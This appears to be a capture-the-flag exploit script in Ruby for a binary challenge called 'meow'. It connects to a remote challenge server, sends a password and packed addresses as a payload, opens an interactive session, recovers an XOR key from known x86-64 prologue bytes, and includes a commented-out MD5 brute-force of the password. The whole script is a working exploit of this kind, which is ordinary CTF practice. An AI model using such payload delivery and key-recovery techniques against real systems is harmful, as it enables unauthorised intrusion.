#!/usr/bin/env ruby
#encoding: ascii-8bit
require 'digest'
require 'pwn'
require_relative '../zocket/zocket'

# pwn part
z = Zocket.new  '110.10.212.139', 50410
z.puts('$W337k!++y')
z.puts 3
z.write 0x14036.p64 + 0x14029.p64 + 0x14000.p64
z.interact

# reveal key part
p t = IO.binread('meow.raw')

p = 1
p table = IO.binread('meow.table').split("\n").map(&:split).map(&:last).map { |c|
  c.bytes.map.with_index.map {|c,i| c == 0x31 ? 9-i : nil}.compact
}
context.arch='amd64'
four = asm("push rbp\nmov rbp, rsp")
4.times do |i|
  p "#{table[i].join('^')} == #{t[i].ord ^ four[i].ord}"
end

last = asm("leave\nret")
p "#{table[-2].join('^')} == #{t[-2].ord ^ last[-2].ord}"
p "#{table[-1].join('^')} == #{t[-1].ord ^ last[-1].ord}"

def dep(a)
  a[5] = a[2] ^ 88
  a[3] = a[2]
  a[1] = a[3] ^ 100
  a[8] = a[1] ^ 124
  a[9] = a[3] ^ 74
  a[0] = a[1] ^ 115
end
a = '$W337k!++y'.split('').map(&:ord)

table.each_with_index do |tt,j|
  tt.each do |i|
    t[j] = (t[j].ord ^ a[tt[i]]).chr
  end
end
p t
=begin
32.upto(126) do |x|
  a = Array.new(10)
  a[2] = x
  dep(a)
  32.upto(126) do |w|
    32.upto(126) do |z|
      32.upto(126) do |y|
        a[4] = w
        a[6] = z
        a[7] = y
        (p a.map(&:chr).join; exit) if Digest::MD5.hexdigest(a.map(&:chr).join) == '9f46a92422658f61a80ddee78e7db914'
      end
    end
  end
end
=end
